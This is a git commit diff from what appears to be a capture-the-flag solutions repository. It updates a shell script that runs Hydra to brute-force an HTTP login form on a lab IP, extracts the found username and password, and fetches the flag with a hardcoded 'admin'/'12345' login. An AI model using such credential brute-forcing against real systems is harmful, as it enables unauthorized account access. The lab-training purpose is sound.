5d71be0471578facc1476252e72b42315815d8fc
flyme2bluemoon <37197710+flyme2bluemoon@users.noreply.github.com>
2020-12-03 18:27:26 -0500

    Improved hydra_bruteforce.sh

--- day03-christmas-chaos/hydra_bruteforce.sh
+++ day03-christmas-chaos/hydra_bruteforce.sh
@@ -1,1 +1,11 @@
-hydra -L usernames.txt -P passwords.txt 10.10.88.75 http-post-form "/login:username=^USER^&password=^PASS^:incorrect"
+output=$(hydra -L usernames.txt -P passwords.txt 10.10.88.75 http-post-form "/login:username=^USER^&password=^PASS^:incorrect");
+
+username=$(echo $output | cut -d':' -f 12 | cut -d' ' -f 2);
+password=$(echo $output | cut -d':' -f 13 | cut -d' ' -f 2);
+
+echo "The username is: $username";
+echo "The password is: $password";
+
+flag=$(curl -s -L --data-raw 'username=admin&password=12345' http://10.10.88.75/login | grep "THM{" | cut -d "{" -f2 | cut -d "}" -f1);
+
+echo "THM{$flag}";
